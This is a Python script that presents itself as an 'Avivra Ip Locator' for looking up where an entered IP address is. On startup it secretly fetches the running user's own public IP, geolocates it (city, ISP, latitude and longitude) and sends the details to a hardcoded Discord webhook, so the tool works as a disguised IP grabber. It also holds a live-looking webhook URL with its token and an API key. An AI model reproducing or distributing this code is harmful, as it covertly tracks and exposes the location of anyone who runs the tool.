import json
from colorama import Fore
from colorama import Style
from msvcrt import getch
from urllib.request import urlopen
from tqdm import tqdm
import progressbar
import time
import os
import shutil
import subprocess
import socket
import requests
import urllib.request
import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime
from update_check import update


cmd = 'mode 70,30'
os.system(cmd)

os.system('title Avivra Ip Locator { Deycrypted By Lior Group }')

def animated_marker():
      
    widgets = [f'{Fore.RED}Loading: {Style.RESET_ALL}', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

clear = lambda: os.system('cls')
clear()

print(f"{Fore.MAGENTA}Wait We Are Checking For Updates...{Style.RESET_ALL}")
update(__file__, "https://raw.githubusercontent.com/username/repo/myProgram.py")

hook = Webhook("https://discord.com/api/webhooks/1040325495037906974/kq_sNm1vDt4ADQ9nEy0EJPqWL1jiIq4oM1-nPEsGjJSQU5T0OhF7CpjQNUz8e3vvS_di")

time = datetime.now().strftime("%H:%M %p")  
ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'https://extreme-ip-lookup.com/json/?key=Hk66wzkvllLHS3DtY17L')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)

while True:
    try:
       ip=input(f"{Fore.GREEN}Enter IP Address: {Style.RESET_ALL}")
       url = "http://ip-api.com/json/"
       trackedip = urlopen(url + ip)
       data = trackedip.read()
       values = json.loads(data)
       print(f"{Fore.RED}City: {Style.RESET_ALL}" + values['city'])
       print(f"{Fore.MAGENTA}Country: {Style.RESET_ALL}" + values['country'])
       print(f"{Fore.BLUE}Name of the region: {Style.RESET_ALL}" + values['regionName'])
       print(f"{Fore.WHITE}Region: {Style.RESET_ALL}" + values['region'])
       print(f"{Fore.CYAN}ISP: {Style.RESET_ALL}" + values['isp'])
       print(f"{Fore.GREEN}ZIP Code: {Style.RESET_ALL}" + values['zip'])

       break

    except:
        print("Make sure you entered a correct IP Address.")
print("")
print("")
print("")
print("")
print(f"{Fore.MAGENTA}Press any key to exit...{Style.RESET_ALL}")
junk = getch()